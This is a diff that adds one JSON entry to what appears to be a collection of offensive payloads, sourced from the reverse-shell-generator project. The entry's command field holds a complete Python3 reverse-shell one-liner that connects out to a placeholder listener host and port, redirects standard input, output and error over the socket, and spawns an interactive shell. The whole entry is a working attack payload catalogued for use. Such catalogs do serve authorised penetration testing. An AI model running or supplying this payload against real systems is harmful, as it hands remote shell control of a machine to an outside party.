@@ -1,0 +1,29 @@
+{
+  "id": "rsg-reverseshell-python3-1",
+  "name": "RSG · ReverseShell · Python3 #1",
+  "command": "export RHOST=\"<lhost>\";export RPORT=<lport>;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"<shell>\")'",
+  "description": "Reverse Shell payload — Python3 #1 (via reverse-shell-generator).",
+  "platform": "linux",
+  "tags": [
+    "rsg",
+    "payload",
+    "reverse-shell",
+    "linux",
+    "mac"
+  ],
+  "source": "rsg",
+  "source_url": "https://www.revshells.com/",
+  "upstream_id": "ReverseShell/Python3 #1/46",
+  "category": "payloads",
+  "subcategory": "reverse-shell",
+  "references": [
+    {
+      "title": "reverse-shell-generator (revshells.com)",
+      "url": "https://www.revshells.com/"
+    },
+    {
+      "title": "reverse-shell-generator GitHub",
+      "url": "https://github.com/0dayCTF/reverse-shell-generator"
+    }
+  ]
+}
